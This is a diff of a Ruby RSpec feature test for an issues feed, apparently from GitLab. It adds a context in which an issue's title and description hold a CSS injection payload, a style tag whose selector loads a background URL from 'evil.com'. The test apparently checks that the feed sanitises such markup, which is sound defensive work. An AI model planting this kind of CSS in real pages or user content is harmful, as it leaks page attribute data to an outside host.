@@ -2,7 +2,7 @@
 
 require 'spec_helper'
 
-RSpec.describe 'Issues Feed', feature_category: :devops_reports do
+RSpec.describe 'Issues Feed', feature_category: :planning_views do
   describe 'GET /issues' do
     let_it_be_with_reload(:user) do
       user = create(:user, email: 'private1@example.com')
@@ -94,13 +94,16 @@ RSpec.describe 'Issues Feed', feature_category: :devops_reports do
       end
     end
 
-    context 'with potentially malicious description' do
+    context 'with Markdown in the title and a potentially malicious description' do
       let_it_be(:malicious_issue) do
+        payload = '<style>*[href^="a"]{background:url(//evil.com/a)}</style>'
+
         create(:issue,
           author: user,
           assignees: [assignee],
           project: project,
-          description: "<style>*[href^=\"a\"]{background:url(//evil.com/a)}</style>\n\n**Legitimate text**",
+          title: "#{payload} Fix #{issue.to_reference} in `parser`",
+          description: "#{payload}\n\n**Legitimate text**",
           due_date: Date.today
         )
       end
